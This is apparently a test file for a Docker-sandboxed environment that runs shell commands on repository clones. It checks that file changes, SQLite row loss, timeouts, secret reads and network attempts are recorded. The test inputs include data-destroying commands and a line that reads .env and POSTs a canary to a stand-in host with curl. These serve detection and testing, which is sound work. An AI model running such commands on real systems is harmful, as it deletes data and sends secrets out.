// [docker] Repo_World.step against the real box image.
// Validates: Requirements 2.2, 2.3, 2.4, 12.2, 14.7
import { spawnSync } from 'node:child_process';
import { afterAll, beforeAll, expect, it } from 'vitest';
import { createRepoWorld, type RepoWorldOptions } from '../src/world/repo-world.js';
import { fingerprintOriginal } from '../src/fs/fingerprint.js';
import { describeDocker } from './docker-available.js';
import { createFixtureRepo, USERS_ROWS, CANARY, type FixtureRepo } from './fixtures/repo.js';

function runningGhostContainers(): string[] {
  const r = spawnSync('docker', ['ps', '-a', '-q', '--filter', 'label=ghost-run.run-id'], { encoding: 'utf8' });
  return r.stdout.split('\n').filter((l) => l.trim() !== '');
}

describeDocker('Repo_World.step in a real box', () => {
  let fixture: FixtureRepo;
  let world: ReturnType<typeof createRepoWorld>;
  const opts = (): RepoWorldOptions => ({ original: fixture.root });
  const containersBefore = new Set<string>();

  beforeAll(async () => {
    for (const id of runningGhostContainers()) containersBefore.add(id);
    fixture = await createFixtureRepo();
    world = createRepoWorld(opts());
  });

  afterAll(async () => {
    await world.dispose();
    fixture.cleanup();
    expect(runningGhostContainers().filter((id) => !containersBefore.has(id))).toEqual([]);
  });

  it('runs an action on a clone, reports Changes, and never touches the input directory or Original', async () => {
    const before = await world.fingerprint();
    const s0 = await world.snapshot();
    expect(s0.result).toEqual({ success: true });
    const inputBefore = (await fingerprintOriginal(s0.state.rootPath)).fingerprint.hash;

    const s1 = await world.step(s0, { command: 'rm -rf data && touch build/new.txt' });
    expect(s1.result).toEqual({ success: true });
    expect(s1.state.rootPath).not.toBe(s0.state.rootPath);
    expect(s1.state.lastStep).toMatchObject({ stepIndex: 0, outcome: 'exited', exitCode: 0 });
    expect(world.diff(s0, s1)).toEqual([
      { kind: 'file-created', path: 'build/new.txt', entryType: 'file' },
      { kind: 'file-deleted', path: 'data', entryType: 'dir' },
      { kind: 'file-deleted', path: 'data/seed.txt', entryType: 'file' },
    ]);

    expect((await fingerprintOriginal(s0.state.rootPath)).fingerprint.hash).toBe(inputBefore);
    expect((await world.fingerprint()).hash).toBe(before.hash);
  }, 60_000);

  it('returns success:false with the exit code for a failing action, without throwing', async () => {
    const s0 = await world.snapshot();
    const s1 = await world.step(s0, { command: 'echo partial > build/partial.txt; exit 3' });
    expect(s1.result).toEqual({ success: false, error: 'action exited with code 3' });
    expect(s1.state.lastStep?.exitCode).toBe(3);
    expect(world.diff(s0, s1)).toContainEqual({ kind: 'file-created', path: 'build/partial.txt', entryType: 'file' });
  }, 60_000);

  it('records a secret read and a network attempt of the step in lastStep.events', async () => {
    const s0 = await world.snapshot();
    const s1 = await world.step(s0, {
      command: `cat .env > /dev/null; curl -s -m 5 -X POST --data '${CANARY}' http://exfil-check.example/in || true`,
    });
    const events = s1.state.lastStep?.events ?? [];
    expect(events).toContainEqual({ kind: 'secret-read', path: '.env', stepIndex: 0 });
    const net = events.find((e) => e.destination === 'exfil-check.example:80');
    expect(net).toBeDefined();
    expect(net?.eventId).toMatch(/^ev-\d+$/);
    expect(JSON.stringify(s1.state)).not.toContain(CANARY);
  }, 60_000);

  it('counts SQLite rows lost by a step as a sql-row-count Change', async () => {
    if (fixture.sqlite === 'placeholder') return; // fixture database is not queryable on this host
    const s0 = await world.snapshot();
    expect(s0.state.sqlite['app.db']).toEqual({ users: USERS_ROWS });
    const s1 = await world.step(s0, { command: 'sqlite3 app.db "DELETE FROM users"' });
    expect(s1.result).toEqual({ success: true });
    expect(s1.state.sqlite['app.db']).toEqual({ users: 0 });
    expect(world.diff(s0, s1)).toContainEqual({
      kind: 'sql-row-count', path: 'app.db', table: 'users', rowsBefore: USERS_ROWS, rowsAfter: 0,
    });
  }, 60_000);

  it('reports a timeout as success:false', async () => {
    const quick = createRepoWorld({ ...opts(), execLimitSec: 1 });
    try {
      const s0 = await quick.snapshot();
      const s1 = await quick.step(s0, { command: 'sleep 20' });
      expect(s1.result.success).toBe(false);
      if (!s1.result.success) expect(s1.result.error).toContain('execution limit');
      expect(s1.state.lastStep?.outcome).toBe('timeout');
    } finally {
      await quick.dispose();
    }
  }, 60_000);
});
